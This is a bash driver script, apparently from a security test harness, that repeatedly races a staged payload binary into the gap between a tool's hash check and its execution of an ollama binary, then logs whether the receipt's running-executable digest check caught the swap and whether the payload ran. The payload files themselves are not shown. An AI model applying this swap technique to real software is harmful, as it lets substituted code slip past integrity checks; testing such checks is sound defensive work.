#!/bin/bash
# A02BinarySwapRace driver. usage: driver.sh <stage> <attempts>
#   stage 1: swap payload server into the hash->exec gap
#   stage 2: swap cooperating create client into the create exec
#   stage 2b: swap exit-0 create client into the create exec
set -u
S=/fast/scratch/hyaku/kama-r60/A02BinarySwapRace
TOOL=/home/vgpnk/Projects/shokunin/kama-shokunin/tools/kama-ollama-live.py
STAGE=$1
MAX=$2

classify() { # $1=W  prints stage,att,rc,verdict,exe_digest,payload_ran,note
  local W=$1 RC=$2
  local verdict exe ran=no
  verdict=$(python3 -c "import json,sys;print(json.load(open('$W/receipt.json'))['verdict'])" 2>/dev/null || echo NO-RECEIPT)
  exe=$(python3 - "$W/receipt.json" <<'PYEOF'
import json, sys
try:
    r = json.load(open(sys.argv[1]))
    c = [x for x in r['checks'] if x['id'] == 'running-exe-digest']
    print(c[0]['passed'] if c else 'not-evaluated')
except Exception:
    print('unknown')
PYEOF
)
  grep -qF "$W/bin/live" $S/hit.log 2>/dev/null && ran=yes
  grep -qF 'PAYLOAD-CLIENT' $S/hit.log 2>/dev/null && [[ $STAGE != 1 ]] && ran=yes
  echo "$STAGE,$ATT,$RC,$verdict,$exe,$ran,"
}

: >> $S/summary.csv
ATT=0
while [ "$ATT" -lt "$MAX" ]; do
  ATT=$((ATT+1))
  W=$S/att-$STAGE-$ATT
  rm -rf "$W"
  mkdir -p "$W/bin" "$W/work/home" "$W/work/models"
  cp -l $S/pinbin "$W/bin/live"
  mkdir -p "$W/bin/lib"
  cp -al $S/libcpu/ollama "$W/bin/lib/ollama"
  case $STAGE in
    1)  cp $S/payload.py "$W/bin/stage"; STAGEWATCH=none ;;
    2)  cp $S/payload-client.sh "$W/bin/stage"; STAGEWATCH="$W/work/Modelfile" ;;
    2b) cp $S/payload-client-exit0.sh "$W/bin/stage"; STAGEWATCH="$W/work/Modelfile" ;;
  esac
  chmod +x "$W/bin/stage"
  cp "$W/bin/stage" "$W/bin/stage.ready"   # exchange twin: staged payload inode
  NONCE="aa${STAGE}x$(printf '%03d' $ATT)z"
  rm -f "$W/flag"
  if [ "$STAGE" = 1 ]; then
    python3 $S/exchange.py "$W/flag" "$W/bin/live" "$W/bin/stage.ready" $S/exchange.log 90 \
      > "$W/exchange.out" 2>&1 &
  else
    python3 $S/exchange2.py "$STAGEWATCH" "$W/bin/live" "$W/bin/stage.ready" $S/exchange.log 90 \
      > "$W/exchange.out" 2>&1 &
  fi
  XP=$!
  TMPDIR=$S/tmp python3 $TOOL --work "$W/work" --nonce "$NONCE" --out "$W/receipt.json" \
    --ollama-bin "$W/bin/live" > "$W/stdout.json" 2> "$W/stderr.txt" &
  TP=$!
  echo $TP > "$W/flag"
  wait $TP; RC=$?
  wait $XP 2>/dev/null
  HITBEFORE=$(grep -cF "$NONCE" $S/hit.log 2>/dev/null || true)
  classify "$W" "$RC" | sed "s/,,$/,nonce=$NONCE hit=$HITBEFORE/" >> $S/summary.csv
done
